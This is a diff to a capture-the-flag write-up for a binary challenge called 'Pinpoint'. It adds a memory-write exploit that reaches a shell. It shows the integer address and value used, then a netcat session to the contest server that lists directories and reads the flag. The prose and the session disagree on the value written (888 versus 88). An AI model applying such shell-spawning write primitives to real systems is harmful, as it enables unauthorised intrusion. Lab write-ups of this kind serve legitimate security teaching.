@@ -441,7 +441,7 @@
 ### 10. Binary: Qualifiers: Pinpoint
   I opened in Ghidra and I analysed the binary with GDB.
 
-  It is clear that the input is related with the ```v``` variable, which has the address: ```0x601058```.
+  As we wat to get to ```system("/bin/sh");```, it is clear that the input is related with the ```v``` variable, which has the address: ```0x601058```.
 
   The input is integer, so ```0x601058``` in integer is ```6295640```.
 
@@ -451,8 +451,58 @@
 
   Than I used ```6295640``` and ```0x20``` as input. After this,I found out that we need also an integer as second input.
 
-  I used the following input: ```6295640``` and ```0x20```. After this I saw in GDB that the address I was writing was wrong.
+  I used the following input: ```6295640``` and ```88```. After this I saw in GDB that the address I was writing was wrong.
 
-  As I need to write to a futher possision in the momory to get the ```0x5358535``` I tried to inscrease the address. I used trial and error method and using ````6295642``` as input worked.
+  As I need to write to a futher possision in the momory to get the ```0x5358535``` I tried to inscrease the address. I used trial and error method and using ````6295642``` and ```888``` as input worked.
+
+  This is the code with the interaction with the server:
+  ```
+  $ nc 141.85.224.99 31337
+
+  address to write to: 6295642
+  value to write: 88
+
+  ls
+
+  bin
+  boot
+  core
+  dev
+  etc
+  home
+  lib
+  lib64
+  media
+  mnt
+  opt
+  proc
+  root
+  run
+  sbin
+  srv
+  sys
+  tmp
+  usr
+  var
+
+  cd home
+
+  ls
+
+  ctf
+
+  cd ctf
+
+  ls
+
+  flag
+  pinpoint
+
+  cat flag
+
+  SSS{aim_for_the_kill}
+
+  exit
+  ```
 
   The final flag is: ```SSS{aim_for_the_kill}```.
